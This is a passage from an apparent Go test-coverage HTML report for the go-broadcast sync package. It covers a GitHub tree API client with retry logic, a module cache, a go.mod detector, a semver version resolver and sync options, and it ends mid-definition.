func (api *GitHubAPI) GetAPIStats() (treeFetches, cacheHits, cacheMisses, retries, rateLimits, avgTreeSize int64) <span class="cov8" title="1">{
        return api.stats.GetStats()
}</span>

// Close closes the cache and cleanup resources
func (api *GitHubAPI) Close() <span class="cov8" title="1">{
        api.cache.Close()
}</span>

// fetchTreeWithRetry fetches the tree with exponential backoff retry logic
func (api *GitHubAPI) fetchTreeWithRetry(ctx context.Context, repo, ref string) (*TreeMap, error) <span class="cov8" title="1">{
        var lastErr error

        for attempt := 0; attempt &lt;= api.maxRetries; attempt++ </span><span class="cov8" title="1">{
                if attempt &gt; 0 </span><span class="cov8" title="1">{
                        // Exponential backoff with jitter
                        delay := time.Duration(float64(api.baseDelay) * math.Pow(2, float64(attempt-1)))
                        // Use crypto/rand for secure jitter calculation
                        jitterMax := big.NewInt(int64(delay / 4))
                        jitterBig, err := rand.Int(rand.Reader, jitterMax)
                        if err != nil </span><span class="cov0" title="0">{
                                // Fallback to 10% of delay if crypto/rand fails
                                jitterBig = big.NewInt(int64(delay / 10))
                        }</span>
                        <span class="cov8" title="1">jitter := time.Duration(jitterBig.Int64())
                        delay += jitter

                        api.logger.WithFields(logrus.Fields{
                                "repo":    repo,
                                "ref":     ref,
                                "attempt": attempt,
                                "delay":   delay,
                        }).Debug("Retrying tree fetch after delay")

                        select </span>{
                        case &lt;-ctx.Done():<span class="cov0" title="0">
                                return nil, ctx.Err()</span>
                        case &lt;-time.After(delay):<span class="cov8" title="1"></span>
                        }

                        <span class="cov8" title="1">api.stats.TotalRetries.Add(1)</span>
                }

                <span class="cov8" title="1">treeMap, err := api.fetchTree(ctx, repo, ref)
                if err == nil </span><span class="cov8" title="1">{
                        // Update average tree size
                        api.updateAverageTreeSize(len(treeMap.files))
                        return treeMap, nil
                }</span>

                <span class="cov8" title="1">lastErr = err

                // Check if it's a rate limit error
                if isRateLimitError(err) </span><span class="cov8" title="1">{
                        api.stats.TotalRateLimit.Add(1)
                        api.logger.WithField("repo", repo).Warn("GitHub API rate limit hit, will retry")
                        continue</span>
                }

                // For non-recoverable errors, don't retry
                <span class="cov8" title="1">if !isGitHubRetryableError(err) </span><span class="cov8" title="1">{
                        break</span>
                }
        }

        <span class="cov8" title="1">return nil, appErrors.WrapWithContext(lastErr, fmt.Sprintf("failed after %d retries", api.maxRetries))</span>
}

// fetchTree performs the actual tree fetch from GitHub API
func (api *GitHubAPI) fetchTree(ctx context.Context, repo, ref string) (*TreeMap, error) <span class="cov8" title="1">{
        // First, get the commit to resolve the ref to a SHA
        commit, err := api.client.GetCommit(ctx, repo, ref)
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "get commit for ref")
        }</span>

        <span class="cov8" title="1">treeSHA := commit.SHA // Use commit SHA as tree SHA initially

        // Fetch tree recursively using the GitHub Git Tree API
        gitTree, err := api.client.GetGitTree(ctx, repo, treeSHA, true)
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "fetch git tree")
        }</span>

        // Build tree map
        <span class="cov8" title="1">treeMap := &amp;TreeMap{
                files:       make(map[string]*GitTreeNode),
                directories: make(map[string]bool),
                sha:         gitTree.SHA,
                fetchedAt:   time.Now(),
        }

        // Process all tree nodes
        for i := range gitTree.Tree </span><span class="cov8" title="1">{
                node := &amp;gitTree.Tree[i]

                switch node.Type </span>{
                case "blob":<span class="cov8" title="1">
                        // It's a file
                        treeMap.files[node.Path] = node

                        // Also mark all parent directories as existing
                        dir := filepath.Dir(node.Path)
                        for dir != "." &amp;&amp; dir != "/" </span><span class="cov8" title="1">{
                                dir = strings.TrimSuffix(dir, "/")
                                treeMap.directories[dir] = true
                                dir = filepath.Dir(dir)
                        }</span>
                case "tree":<span class="cov8" title="1">
                        // It's a directory
                        treeMap.directories[node.Path] = true</span>
                }
        }

        // Handle pagination if tree was truncated
        <span class="cov8" title="1">if gitTree.Truncated </span><span class="cov8" title="1">{
                api.logger.WithField("repo", repo).Warn("Git tree was truncated, some files may not be cached")
        }</span>

        <span class="cov8" title="1">return treeMap, nil</span>
}

// updateAverageTreeSize updates the rolling average of tree sizes
func (api *GitHubAPI) updateAverageTreeSize(newSize int) <span class="cov8" title="1">{
        // Simple rolling average implementation
        for </span><span class="cov8" title="1">{
                current := api.stats.AverageTreeSize.Load()
                var newAvg int64
                if current == 0 </span><span class="cov8" title="1">{
                        // First measurement
                        newAvg = int64(newSize)
                }</span> else<span class="cov8" title="1"> {
                        // Weight new size as 10% of the average
                        newAvg = (current*9 + int64(newSize)) / 10
                }</span>
                <span class="cov8" title="1">if api.stats.AverageTreeSize.CompareAndSwap(current, newAvg) </span><span class="cov8" title="1">{
                        break</span>
                }
        }
}

// isRateLimitError checks if an error is due to GitHub API rate limiting
func isRateLimitError(err error) bool <span class="cov8" title="1">{
        if err == nil </span><span class="cov0" title="0">{
                return false
        }</span>
        <span class="cov8" title="1">errStr := strings.ToLower(err.Error())
        return strings.Contains(errStr, "rate limit") ||
                strings.Contains(errStr, "403") ||
                strings.Contains(errStr, "x-ratelimit")</span>
}

// isGitHubRetryableError checks if an error is retryable
func isGitHubRetryableError(err error) bool <span class="cov8" title="1">{
        if err == nil </span><span class="cov0" title="0">{
                return false
        }</span>
        <span class="cov8" title="1">errStr := strings.ToLower(err.Error())

        // Network errors, timeouts, and 5xx errors are retryable
        return strings.Contains(errStr, "timeout") ||
                strings.Contains(errStr, "connection") ||
                strings.Contains(errStr, "network") ||
                strings.Contains(errStr, "502") ||
                strings.Contains(errStr, "503") ||
                strings.Contains(errStr, "504") ||
                strings.Contains(errStr, "temporary")</span>
}

// countTrue counts the number of true values in a boolean map
func countTrue(m map[string]bool) int <span class="cov8" title="1">{
        count := 0
        for _, v := range m </span><span class="cov8" title="1">{
                if v </span><span class="cov8" title="1">{
                        count++
                }</span>
        }
        <span class="cov8" title="1">return count</span>
}

// TreeAPIClient provides tree-specific operations for GitHub repositories
type TreeAPIClient interface {
        // GetTree fetches the complete file tree for a repository
        GetTree(ctx context.Context, repo, ref string) (*TreeMap, error)

        // BatchCheckFiles efficiently checks multiple file paths
        BatchCheckFiles(ctx context.Context, repo, ref string, filePaths []string) (map[string]bool, error)

        // BatchCheckDirectories efficiently checks multiple directory paths
        BatchCheckDirectories(ctx context.Context, repo, ref string, dirPaths []string) (map[string]bool, error)

        // GetFilesInDirectory returns all files in a directory
        GetFilesInDirectory(ctx context.Context, repo, ref, dirPath string) ([]*GitTreeNode, error)

        // InvalidateCache removes cached tree data
        InvalidateCache(repo, ref string)

        // GetCacheStats returns cache performance metrics
        GetCacheStats() (hits, misses int64, size int, hitRate float64)

        // GetAPIStats returns API call statistics
        GetAPIStats() (treeFetches, cacheHits, cacheMisses, retries, rateLimits, avgTreeSize int64)

        // Close cleanup resources
        Close()
}

// Ensure GitHubAPI implements TreeAPIClient
var _ TreeAPIClient = (*GitHubAPI)(nil)
</pre>

		<pre class="file" id="file64" style="display: none">package sync

import (
        "sync"
        "time"

        "github.com/sirupsen/logrus"
)

// ModuleCacheEntry represents a cached module version resolution
type ModuleCacheEntry struct {
        Value     string
        ExpiresAt time.Time
}

// ModuleCache provides thread-safe caching for module version resolutions
type ModuleCache struct {
        entries map[string]*ModuleCacheEntry
        mu      sync.RWMutex
        ttl     time.Duration
        logger  *logrus.Logger
        done    chan struct{}
        once    sync.Once
}

// NewModuleCache creates a new module cache with the specified TTL
func NewModuleCache(ttl time.Duration, logger *logrus.Logger) *ModuleCache <span class="cov8" title="1">{
        if ttl &lt;= 0 </span><span class="cov8" title="1">{
                ttl = 5 * time.Minute // Default TTL
        }</span>

        <span class="cov8" title="1">cache := &amp;ModuleCache{
                entries: make(map[string]*ModuleCacheEntry),
                ttl:     ttl,
                logger:  logger,
                done:    make(chan struct{}),
        }

        // Start cleanup goroutine
        go cache.cleanupExpired()

        return cache</span>
}

// Get retrieves a value from the cache
func (c *ModuleCache) Get(key string) (string, bool) <span class="cov8" title="1">{
        c.mu.RLock()
        defer c.mu.RUnlock()

        entry, exists := c.entries[key]
        if !exists </span><span class="cov8" title="1">{
                return "", false
        }</span>

        // Check if expired
        <span class="cov8" title="1">if time.Now().After(entry.ExpiresAt) </span><span class="cov0" title="0">{
                return "", false
        }</span>

        <span class="cov8" title="1">c.logger.WithFields(logrus.Fields{
                "key":   key,
                "value": entry.Value,
        }).Debug("Cache hit")

        return entry.Value, true</span>
}

// Set stores a value in the cache
func (c *ModuleCache) Set(key, value string) <span class="cov8" title="1">{
        c.mu.Lock()
        defer c.mu.Unlock()

        c.entries[key] = &amp;ModuleCacheEntry{
                Value:     value,
                ExpiresAt: time.Now().Add(c.ttl),
        }

        c.logger.WithFields(logrus.Fields{
                "key":   key,
                "value": value,
                "ttl":   c.ttl,
        }).Debug("Cache set")
}</span>

// SetWithTTL stores a value in the cache with a custom TTL
func (c *ModuleCache) SetWithTTL(key, value string, ttl time.Duration) <span class="cov8" title="1">{
        c.mu.Lock()
        defer c.mu.Unlock()

        c.entries[key] = &amp;ModuleCacheEntry{
                Value:     value,
                ExpiresAt: time.Now().Add(ttl),
        }

        c.logger.WithFields(logrus.Fields{
                "key":   key,
                "value": value,
                "ttl":   ttl,
        }).Debug("Cache set with custom TTL")
}</span>

// Delete removes a value from the cache
func (c *ModuleCache) Delete(key string) <span class="cov8" title="1">{
        c.mu.Lock()
        defer c.mu.Unlock()

        delete(c.entries, key)

        c.logger.WithField("key", key).Debug("Cache delete")
}</span>

// Clear removes all entries from the cache
func (c *ModuleCache) Clear() <span class="cov8" title="1">{
        c.mu.Lock()
        defer c.mu.Unlock()

        oldSize := len(c.entries)
        c.entries = make(map[string]*ModuleCacheEntry)

        c.logger.WithField("entries_cleared", oldSize).Info("Cache cleared")
}</span>

// Size returns the number of entries in the cache
func (c *ModuleCache) Size() int <span class="cov8" title="1">{
        c.mu.RLock()
        defer c.mu.RUnlock()

        return len(c.entries)
}</span>

// cleanupExpired periodically removes expired entries
func (c *ModuleCache) cleanupExpired() <span class="cov8" title="1">{
        ticker := time.NewTicker(c.ttl / 2) // Cleanup every half TTL
        defer ticker.Stop()

        for </span><span class="cov8" title="1">{
                select </span>{
                case &lt;-c.done:<span class="cov8" title="1">
                        return</span>
                case &lt;-ticker.C:<span class="cov8" title="1">
                        c.mu.Lock()
                        now := time.Now()
                        expired := 0

                        for key, entry := range c.entries </span><span class="cov8" title="1">{
                                if now.After(entry.ExpiresAt) </span><span class="cov8" title="1">{
                                        delete(c.entries, key)
                                        expired++
                                }</span>
                        }

                        <span class="cov8" title="1">c.mu.Unlock()

                        if expired &gt; 0 </span><span class="cov8" title="1">{
                                c.logger.WithField("expired_entries", expired).Debug("Cleaned up expired cache entries")
                        }</span>
                }
        }
}

// Close shuts down the cache and stops the cleanup goroutine
func (c *ModuleCache) Close() <span class="cov8" title="1">{
        c.once.Do(func() </span><span class="cov8" title="1">{
                close(c.done)
        }</span>)
}

// Stats returns cache statistics
func (c *ModuleCache) Stats() map[string]interface{} <span class="cov8" title="1">{
        c.mu.RLock()
        defer c.mu.RUnlock()

        var totalExpired int
        now := time.Now()

        for _, entry := range c.entries </span><span class="cov8" title="1">{
                if now.After(entry.ExpiresAt) </span><span class="cov0" title="0">{
                        totalExpired++
                }</span>
        }

        <span class="cov8" title="1">return map[string]interface{}{
                "total_entries": len(c.entries),
                "expired":       totalExpired,
                "active":        len(c.entries) - totalExpired,
                "ttl_seconds":   c.ttl.Seconds(),
        }</span>
}

// GetOrCompute retrieves a value from cache or computes it if not present
func (c *ModuleCache) GetOrCompute(key string, compute func() (string, error)) (string, error) <span class="cov8" title="1">{
        // Try to get from cache first
        if value, found := c.Get(key); found </span><span class="cov8" title="1">{
                return value, nil
        }</span>

        // Compute the value
        <span class="cov8" title="1">value, err := compute()
        if err != nil </span><span class="cov8" title="1">{
                return "", err
        }</span>

        // Store in cache
        <span class="cov8" title="1">c.Set(key, value)

        return value, nil</span>
}

// Invalidate removes all cache entries matching a pattern
func (c *ModuleCache) Invalidate(pattern string) int <span class="cov8" title="1">{
        c.mu.Lock()
        defer c.mu.Unlock()

        invalidated := 0
        for key := range c.entries </span><span class="cov8" title="1">{
                // Simple prefix matching for now
                if len(pattern) &gt; 0 &amp;&amp; len(key) &gt;= len(pattern) &amp;&amp; key[:len(pattern)] == pattern </span><span class="cov8" title="1">{
                        delete(c.entries, key)
                        invalidated++
                }</span>
        }

        <span class="cov8" title="1">if invalidated &gt; 0 </span><span class="cov8" title="1">{
                c.logger.WithFields(logrus.Fields{
                        "pattern":     pattern,
                        "invalidated": invalidated,
                }).Debug("Cache entries invalidated")
        }</span>

        <span class="cov8" title="1">return invalidated</span>
}
</pre>

		<pre class="file" id="file65" style="display: none">package sync

import (
        "bufio"
        "errors"
        "fmt"
        "os"
        "path/filepath"
        "strings"

        "github.com/sirupsen/logrus"
)

// Static errors for module detection
var (
        ErrNoModuleDirective = errors.New("go.mod does not contain a module directive")
        ErrNoGoModFound      = errors.New("no go.mod found in directory or parent directories")
)

// ModuleInfo contains information about a Go module
type ModuleInfo struct {
        Name    string // Module name from go.mod
        Path    string // Path to the module directory
        Version string // Current version if specified in go.mod
        GoMod   string // Path to go.mod file
}

// ModuleDetector detects and analyzes Go modules in directories
type ModuleDetector struct {
        logger *logrus.Logger
}

// NewModuleDetector creates a new module detector
func NewModuleDetector(logger *logrus.Logger) *ModuleDetector <span class="cov8" title="1">{
        return &amp;ModuleDetector{
                logger: logger,
        }
}</span>

// IsGoModule checks if a directory contains a Go module
func (d *ModuleDetector) IsGoModule(dir string) bool <span class="cov8" title="1">{
        goModPath := filepath.Join(dir, "go.mod")
        info, err := os.Stat(goModPath)
        if err != nil </span><span class="cov8" title="1">{
                return false
        }</span>
        <span class="cov8" title="1">return !info.IsDir()</span>
}

// DetectModule detects and parses module information from a directory
func (d *ModuleDetector) DetectModule(dir string) (*ModuleInfo, error) <span class="cov8" title="1">{
        if !d.IsGoModule(dir) </span><span class="cov8" title="1">{
                return nil, nil //nolint:nilnil // Not a module is a valid state, not an error
        }</span>

        <span class="cov8" title="1">goModPath := filepath.Join(dir, "go.mod")
        moduleInfo, err := d.parseGoMod(goModPath)
        if err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to parse go.mod: %w", err)
        }</span>

        <span class="cov8" title="1">moduleInfo.Path = dir
        moduleInfo.GoMod = goModPath

        d.logger.WithFields(logrus.Fields{
                "module":  moduleInfo.Name,
                "path":    moduleInfo.Path,
                "version": moduleInfo.Version,
        }).Debug("Detected Go module")

        return moduleInfo, nil</span>
}

// DetectModules finds all Go modules in a directory tree
func (d *ModuleDetector) DetectModules(rootDir string) ([]*ModuleInfo, error) <span class="cov8" title="1">{
        var modules []*ModuleInfo

        err := filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error </span><span class="cov8" title="1">{
                if err != nil </span><span class="cov0" title="0">{
                        return err
                }</span>

                // Skip if not a directory
                <span class="cov8" title="1">if !info.IsDir() </span><span class="cov0" title="0">{
                        return nil
                }</span>

                // Check if this directory contains a module
                <span class="cov8" title="1">if moduleInfo, err := d.DetectModule(path); err != nil </span><span class="cov0" title="0">{
                        d.logger.WithError(err).WithField("path", path).Warn("Failed to detect module")
                }</span> else<span class="cov8" title="1"> if moduleInfo != nil </span><span class="cov8" title="1">{
                        modules = append(modules, moduleInfo)
                        // Skip subdirectories of modules (modules can't be nested)
                        return filepath.SkipDir
                }</span>

                <span class="cov8" title="1">return nil</span>
        })
        <span class="cov8" title="1">if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to walk directory tree: %w", err)
        }</span>

        <span class="cov8" title="1">d.logger.WithField("count", len(modules)).Info("Detected Go modules")
        return modules, nil</span>
}

// parseGoMod parses a go.mod file to extract module information
func (d *ModuleDetector) parseGoMod(goModPath string) (*ModuleInfo, error) <span class="cov8" title="1">{
        file, err := os.Open(goModPath) //nolint:gosec // Input is validated by caller
        if err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to open go.mod: %w", err)
        }</span>
        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{ _ = file.Close() }</span>()

        <span class="cov8" title="1">info := &amp;ModuleInfo{}
        scanner := bufio.NewScanner(file)

        for scanner.Scan() </span><span class="cov8" title="1">{
                line := strings.TrimSpace(scanner.Text())

                // Skip comments and empty lines
                if strings.HasPrefix(line, "//") || line == "" </span><span class="cov8" title="1">{
                        continue</span>
                }

                // Parse module directive
                <span class="cov8" title="1">if strings.HasPrefix(line, "module ") </span><span class="cov8" title="1">{
                        parts := strings.Fields(line)
                        if len(parts) &gt;= 2 </span><span class="cov8" title="1">{
                                info.Name = parts[1]
                        }</span>
                }

                // Check for retract directive with version (indicates current version)
                // This is a simple heuristic; real version would come from git tags
                // or be specified in the module config

                // Stop at the first require block
                <span class="cov8" title="1">if strings.HasPrefix(line, "require") </span><span class="cov8" title="1">{
                        break</span>
                }
        }

        <span class="cov8" title="1">if err := scanner.Err(); err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to scan go.mod: %w", err)
        }</span>

        <span class="cov8" title="1">if info.Name == "" </span><span class="cov8" title="1">{
                return nil, ErrNoModuleDirective
        }</span>

        <span class="cov8" title="1">return info, nil</span>
}

// GetModuleName returns the module name from a go.mod file
func (d *ModuleDetector) GetModuleName(goModPath string) (string, error) <span class="cov8" title="1">{
        info, err := d.parseGoMod(goModPath)
        if err != nil </span><span class="cov8" title="1">{
                return "", err
        }</span>
        <span class="cov8" title="1">return info.Name, nil</span>
}

// FindGoModInParents searches for a go.mod file in parent directories
func (d *ModuleDetector) FindGoModInParents(startDir string) (string, error) <span class="cov8" title="1">{
        absPath, err := filepath.Abs(startDir)
        if err != nil </span><span class="cov0" title="0">{
                return "", fmt.Errorf("failed to get absolute path: %w", err)
        }</span>

        <span class="cov8" title="1">current := absPath
        for </span><span class="cov8" title="1">{
                goModPath := filepath.Join(current, "go.mod")
                if info, err := os.Stat(goModPath); err == nil &amp;&amp; !info.IsDir() </span><span class="cov8" title="1">{
                        return current, nil
                }</span>

                <span class="cov8" title="1">parent := filepath.Dir(current)
                if parent == current </span><span class="cov8" title="1">{
                        // Reached root directory
                        break</span>
                }
                <span class="cov8" title="1">current = parent</span>
        }

        <span class="cov8" title="1">return "", fmt.Errorf("%w: %s", ErrNoGoModFound, startDir)</span>
}
</pre>

		<pre class="file" id="file66" style="display: none">package sync

import (
        "context"
        "errors"
        "fmt"
        "os/exec"
        "sort"
        "strings"

        "github.com/Masterminds/semver/v3"
        "github.com/sirupsen/logrus"
)

// Static errors for module resolution
var (
        ErrNoVersionsAvailable      = errors.New("no versions available")
        ErrNoValidSemanticVersions  = errors.New("no valid semantic versions found")
        ErrVersionNotFound          = errors.New("version not found")
        ErrNoVersionMatches         = errors.New("no version matches constraint")
        ErrCannotResolveWithoutTags = errors.New("cannot resolve version constraint without git tags")
        ErrInvalidSemverConstraint  = errors.New("invalid semver constraint")
)

// ModuleResolver resolves module version constraints to concrete versions
type ModuleResolver struct {
        logger *logrus.Logger
        cache  *ModuleCache
}

// NewModuleResolver creates a new module version resolver
func NewModuleResolver(logger *logrus.Logger, cache *ModuleCache) *ModuleResolver <span class="cov8" title="1">{
        return &amp;ModuleResolver{
                logger: logger,
                cache:  cache,
        }
}</span>

// ResolveVersion resolves a version constraint to a concrete version
// Supports:
// - Exact versions: "v1.2.3"
// - Latest: "latest"
// - Semver constraints: "~1.2", "^1.2", "&gt;=1.2.0", etc.
func (r *ModuleResolver) ResolveVersion(ctx context.Context, repoPath, constraint string, checkTags bool) (string, error) <span class="cov8" title="1">{
        // Check cache first
        cacheKey := fmt.Sprintf("%s:%s", repoPath, constraint)
        if cached, found := r.cache.Get(cacheKey); found </span><span class="cov8" title="1">{
                r.logger.WithFields(logrus.Fields{
                        "repo":       repoPath,
                        "constraint": constraint,
                        "version":    cached,
                }).Debug("Using cached version resolution")
                return cached, nil
        }</span>

        // Get available versions
        <span class="cov8" title="1">var availableVersions []string
        var err error

        if checkTags </span><span class="cov8" title="1">{
                availableVersions, err = r.fetchGitTags(ctx, repoPath)
                if err != nil </span><span class="cov8" title="1">{
                        return "", fmt.Errorf("failed to fetch git tags: %w", err)
                }</span>
        } else<span class="cov8" title="1"> {
                // Without tags, we can't resolve versions
                if constraint != "latest" &amp;&amp; !strings.HasPrefix(constraint, "v") </span><span class="cov8" title="1">{
                        return "", ErrCannotResolveWithoutTags
                }</span>
                // For exact versions without tag checking, just return as-is
                <span class="cov8" title="1">if strings.HasPrefix(constraint, "v") </span><span class="cov8" title="1">{
                        r.cache.Set(cacheKey, constraint)
                        return constraint, nil
                }</span>
        }

        // Resolve based on constraint type
        <span class="cov0" title="0">var resolved string
        switch constraint </span>{
        case "latest":<span class="cov0" title="0">
                resolved, err = r.resolveLatest(availableVersions)</span>
        case "":<span class="cov0" title="0">
                // Empty constraint means latest
                resolved, err = r.resolveLatest(availableVersions)</span>
        default:<span class="cov0" title="0">
                if strings.HasPrefix(constraint, "v") &amp;&amp; !strings.ContainsAny(constraint, "~^&lt;&gt;=*") </span><span class="cov0" title="0">{
                        // Exact version
                        resolved, err = r.resolveExact(availableVersions, constraint)
                }</span> else<span class="cov0" title="0"> {
                        // Semver constraint
                        resolved, err = r.resolveSemver(availableVersions, constraint)
                }</span>
        }

        <span class="cov0" title="0">if err != nil </span><span class="cov0" title="0">{
                return "", err
        }</span>

        // Cache the result
        <span class="cov0" title="0">r.cache.Set(cacheKey, resolved)

        r.logger.WithFields(logrus.Fields{
                "repo":       repoPath,
                "constraint": constraint,
                "resolved":   resolved,
        }).Info("Resolved module version")

        return resolved, nil</span>
}

// fetchGitTags fetches all git tags from a repository
func (r *ModuleResolver) fetchGitTags(ctx context.Context, repoPath string) ([]string, error) <span class="cov8" title="1">{
        // Use git ls-remote to get tags
        cmd := exec.CommandContext(ctx, "git", "ls-remote", "--tags", repoPath)
        output, err := cmd.Output()
        if err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to run git ls-remote: %w", err)
        }</span>

        <span class="cov0" title="0">var tags []string
        lines := strings.Split(string(output), "\n")
        for _, line := range lines </span><span class="cov0" title="0">{
                if line == "" </span><span class="cov0" title="0">{
                        continue</span>
                }

                // Parse tag from ls-remote output
                // Format: &lt;hash&gt;\trefs/tags/&lt;tag&gt;
                <span class="cov0" title="0">parts := strings.Split(line, "\t")
                if len(parts) != 2 </span><span class="cov0" title="0">{
                        continue</span>
                }

                <span class="cov0" title="0">tagRef := parts[1]
                if !strings.HasPrefix(tagRef, "refs/tags/") </span><span class="cov0" title="0">{
                        continue</span>
                }

                // Skip annotated tag markers (^{})
                <span class="cov0" title="0">if strings.HasSuffix(tagRef, "^{}") </span><span class="cov0" title="0">{
                        continue</span>
                }

                <span class="cov0" title="0">tag := strings.TrimPrefix(tagRef, "refs/tags/")

                // Only include semver-like tags
                if strings.HasPrefix(tag, "v") </span><span class="cov0" title="0">{
                        tags = append(tags, tag)
                }</span>
        }

        <span class="cov0" title="0">r.logger.WithFields(logrus.Fields{
                "repo":  repoPath,
                "count": len(tags),
        }).Debug("Fetched git tags")

        return tags, nil</span>
}

// resolveLatest finds the latest version from available versions
func (r *ModuleResolver) resolveLatest(versions []string) (string, error) <span class="cov8" title="1">{
        if len(versions) == 0 </span><span class="cov8" title="1">{
                return "", ErrNoVersionsAvailable
        }</span>

        // Parse all versions
        <span class="cov8" title="1">semverList := make([]*semver.Version, 0, len(versions))
        for _, v := range versions </span><span class="cov8" title="1">{
                parsed, err := semver.NewVersion(v)
                if err != nil </span><span class="cov8" title="1">{
                        r.logger.WithField("version", v).Debug("Skipping invalid semver")
                        continue</span>
                }
                <span class="cov8" title="1">semverList = append(semverList, parsed)</span>
        }

        <span class="cov8" title="1">if len(semverList) == 0 </span><span class="cov8" title="1">{
                return "", ErrNoValidSemanticVersions
        }</span>

        // Sort by version (highest first)
        <span class="cov8" title="1">sort.Sort(sort.Reverse(semver.Collection(semverList)))

        // Return the highest version
        return "v" + semverList[0].String(), nil</span>
}

// resolveExact checks if an exact version exists
func (r *ModuleResolver) resolveExact(versions []string, target string) (string, error) <span class="cov8" title="1">{
        for _, v := range versions </span><span class="cov8" title="1">{
                if v == target </span><span class="cov8" title="1">{
                        return v, nil
                }</span>
        }
        <span class="cov8" title="1">return "", fmt.Errorf("%w: %s", ErrVersionNotFound, target)</span>
}

// resolveSemver resolves a semver constraint to a concrete version
func (r *ModuleResolver) resolveSemver(versions []string, constraint string) (string, error) <span class="cov8" title="1">{
        // Parse the constraint
        c, err := semver.NewConstraint(constraint)
        if err != nil </span><span class="cov8" title="1">{
                return "", fmt.Errorf("%w %s: %w", ErrInvalidSemverConstraint, constraint, err)
        }</span>

        // Find all matching versions
        <span class="cov8" title="1">var matches []*semver.Version
        for _, v := range versions </span><span class="cov8" title="1">{
                parsed, err := semver.NewVersion(v)
                if err != nil </span><span class="cov0" title="0">{
                        r.logger.WithField("version", v).Debug("Skipping invalid semver")
                        continue</span>
                }

                <span class="cov8" title="1">if c.Check(parsed) </span><span class="cov8" title="1">{
                        matches = append(matches, parsed)
                }</span>
        }

        <span class="cov8" title="1">if len(matches) == 0 </span><span class="cov8" title="1">{
                return "", fmt.Errorf("%w: %s", ErrNoVersionMatches, constraint)
        }</span>

        // Sort by version (highest first)
        <span class="cov8" title="1">sort.Sort(sort.Reverse(semver.Collection(matches)))

        // Return the highest matching version
        return "v" + matches[0].String(), nil</span>
}

// GetAvailableVersions returns all available versions for a repository
func (r *ModuleResolver) GetAvailableVersions(ctx context.Context, repoPath string) ([]string, error) <span class="cov0" title="0">{
        // Check cache for available versions
        cacheKey := fmt.Sprintf("%s:_versions", repoPath)
        if cached, found := r.cache.Get(cacheKey); found </span><span class="cov0" title="0">{
                // Parse cached versions (stored as comma-separated)
                return strings.Split(cached, ","), nil
        }</span>

        <span class="cov0" title="0">versions, err := r.fetchGitTags(ctx, repoPath)
        if err != nil </span><span class="cov0" title="0">{
                return nil, err
        }</span>

        // Parse and validate versions
        <span class="cov0" title="0">var validVersions []string
        for _, v := range versions </span><span class="cov0" title="0">{
                if _, err := semver.NewVersion(v); err == nil </span><span class="cov0" title="0">{
                        validVersions = append(validVersions, v)
                }</span>
        }

        // Sort versions
        <span class="cov0" title="0">sort.Slice(validVersions, func(i, j int) bool </span><span class="cov0" title="0">{
                vi, _ := semver.NewVersion(validVersions[i])
                vj, _ := semver.NewVersion(validVersions[j])
                return vi.GreaterThan(vj)
        }</span>)

        // Cache the result
        <span class="cov0" title="0">if len(validVersions) &gt; 0 </span><span class="cov0" title="0">{
                r.cache.Set(cacheKey, strings.Join(validVersions, ","))
        }</span>

        <span class="cov0" title="0">return validVersions, nil</span>
}

// IsVersionConstraint checks if a string is a version constraint
func (r *ModuleResolver) IsVersionConstraint(s string) bool <span class="cov8" title="1">{
        // Check for exact version
        if strings.HasPrefix(s, "v") &amp;&amp; !strings.ContainsAny(s, "~^&lt;&gt;=*") </span><span class="cov8" title="1">{
                _, err := semver.NewVersion(s)
                return err == nil
        }</span>

        // Check for "latest"
        <span class="cov8" title="1">if s == "latest" || s == "" </span><span class="cov8" title="1">{
                return true
        }</span>

        // Check for semver constraint
        <span class="cov8" title="1">_, err := semver.NewConstraint(s)
        return err == nil</span>
}
</pre>

		<pre class="file" id="file67" style="display: none">package sync

import "time"

// Options configures the behavior of the sync engine
type Options struct {
        // DryRun indicates whether to simulate changes without making them
        DryRun bool

        // Force indicates whether to sync even if targets appear up-to-date
        Force bool

        // MaxConcurrency controls how many repositories can be synced simultaneously
        MaxConcurrency int

        // UpdateExistingPRs indicates whether to update existing sync PRs
        UpdateExistingPRs bool

        // Timeout is the maximum time to wait for each repository sync
        Timeout time.Duration

        // CleanupTempFiles indicates whether to clean up temporary files after sync
        CleanupTempFiles bool

        // GroupFilter specifies which groups to sync (by name or ID)
        // Empty means sync all groups
        GroupFilter []string

        // SkipGroups specifies which groups to skip (by name or ID)
        SkipGroups []string
}

// DefaultOptions returns the default sync options
func DefaultOptions() *Options <span class="cov8" title="1">{
        return &amp;Options{
                DryRun:            false,
                Force:             false,
                MaxConcurrency:    5,
                UpdateExistingPRs: true,
                Timeout:           10 * time.Minute,
                CleanupTempFiles:  true,
        }
}</span>

// WithDryRun sets the dry-run option
func (o *Options) WithDryRun(dryRun bool) *Options <span class="cov8" title="1">{
        o.DryRun = dryRun
        return o
}</span>

// WithForce sets the force option
func (o *Options) WithForce(force bool) *Options <span class="cov8" title="1">{
        o.Force = force
        return o
}</span>

// WithMaxConcurrency sets the maximum concurrency
func (o *Options) WithMaxConcurrency(maxConcurrency int) *Options <span class="cov8" title="1">{
        if maxConcurrency &lt;= 0 </span><span class="cov8" title="1">{
                maxConcurrency = 1
        }</span>
        <span class="cov8" title="1">o.MaxConcurrency = maxConcurrency
        return o</span>
}

// WithTimeout sets the sync timeout
func (o *Options) WithTimeout(timeout time.Duration) *Options <span class="cov8" title="1">{
        o.Timeout = timeout
        return o
}</span>

// WithGroupFilter sets the groups to sync
func (o *Options) WithGroupFilter(groups []string) *Options <span class="cov0" title="0">{
        o.GroupFilter = groups
        return o
}</span>

// WithSkipGroups sets the groups to skip
func (o *Options) WithSkipGroups(skipGroups []string) *Options <span class="cov0" title="0">{
        o.SkipGroups = skipGroups
        return o
}</span>
</pre>

		<pre class="file" id="file68" style="display: none">package sync

import (
        "context"
        "errors"
        "fmt"
        "time"

        "github.com/sirupsen/logrus"

        "github.com/mrz1836/go-broadcast/internal/config"
)

// Static errors for orchestration
var (
        ErrOrchestrationFailures = errors.New("group orchestration completed with failures")
)

// GroupStatus represents the execution status of a group
type GroupStatus struct {
